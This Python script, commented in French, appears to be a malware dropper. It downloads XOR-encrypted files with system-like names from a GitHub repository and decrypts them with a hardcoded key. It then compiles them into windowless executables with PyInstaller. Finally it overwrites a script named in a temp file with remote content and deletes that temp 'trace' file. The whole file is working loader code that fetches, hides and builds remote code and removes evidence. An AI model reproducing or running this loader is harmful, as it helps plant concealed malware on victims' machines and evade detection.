import os
import tempfile
import requests
import subprocess
import sys

# === Clé de décryptage ===
CLE = "LUCORACORE987"

# === URLs des fichiers à télécharger ===
URLS = {
    "SystemRuntime32.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
    "wmihelper.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc"
}

# === Dossier de sortie pour les .exe ===
DOSSIER_SORTIE = r"C:\Users\LOUKITA\Desktop\Test23"


def verifier_et_installer_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        print("[...] PyInstaller non trouvé. Installation...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        print("[✓] PyInstaller installé.")


def decrypt(texte, cle):
    cle_repetee = (cle * ((len(texte) // len(cle)) + 1))[:len(texte)]
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(texte, cle_repetee))


def telecharger_et_decrypter(nom, url, cle):
    chemin_temp = os.path.join(tempfile.gettempdir(), nom)
    try:
        print(f"[↓] Téléchargement de {url}")
        r = requests.get(url, timeout=10)
        r.raise_for_status()

        contenu_crypte = r.content.decode("utf-8", errors="ignore")
        contenu_decrypte = decrypt(contenu_crypte, cle)

        with open(chemin_temp, "w", encoding="utf-8") as f:
            f.write(contenu_decrypte)
        print(f"[✓] Déchiffré et enregistré dans : {chemin_temp}")
        return chemin_temp
    except Exception as e:
        print(f"[!] Erreur avec {nom} : {e}")
        return None


def compiler_en_exe(source_path, dossier_sortie):
    nom_fichier = os.path.basename(source_path).replace(".py", "")
    try:
        subprocess.run([
            "pyinstaller",
            "--noconfirm",
            "--onefile",
            "--windowed",  # Pas de fenêtre
            "--distpath", dossier_sortie,
            source_path
        ], check=True)
        print(f"[✓] Compilé en .exe : {nom_fichier}.exe")
    except Exception as e:
        print(f"[!] Erreur compilation : {e}")


def modifier_et_supprimer_trace():
    temp_dir = tempfile.gettempdir()
    fichier_temp = os.path.join(temp_dir, "s_path.txt")
    raw_url = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"

    print(f"[i] Temp dir : {temp_dir}")
    print(f"[i] Fichier trace : {fichier_temp}")

    if not os.path.isfile(fichier_temp):
        print("[!] Le fichier s_path.txt est introuvable.")
        return

    with open(fichier_temp, "r") as f:
        chemin_script = f.read().strip()

    print(f"[i] Chemin lu dans le fichier : {chemin_script}")

    if not os.path.isfile(chemin_script):
        print(f"[!] Fichier cible introuvable : {chemin_script}")
        return

    try:
        print(f"[...] Téléchargement depuis {raw_url}")
        r = requests.get(raw_url, timeout=10)
        if r.status_code == 200 and r.text.strip():
            with open(chemin_script, "w", encoding="utf-8") as f_script:
                f_script.write(r.text)
            print(f"[✓] Script mis à jour avec succès : {chemin_script}")
        else:
            print(f"[!] Échec du téléchargement. Code HTTP : {r.status_code}")
    except Exception as e:
        print(f"[!] Erreur lors du téléchargement : {e}")
        return

    try:
        os.remove(fichier_temp)
        print("[✓] Fichier s_path.txt supprimé.")
    except Exception as e:
        print(f"[!] Erreur lors de la suppression : {e}")


def main():
    os.makedirs(DOSSIER_SORTIE, exist_ok=True)

    verifier_et_installer_pyinstaller()

    fichiers_decryptes = []
    for nom, url in URLS.items():
        chemin = telecharger_et_decrypter(nom, url, CLE)
        if chemin:
            fichiers_decryptes.append(chemin)

    for fichier in fichiers_decryptes:
        compiler_en_exe(fichier, DOSSIER_SORTIE)

    modifier_et_supprimer_trace()


if __name__ == "__main__":
    main()
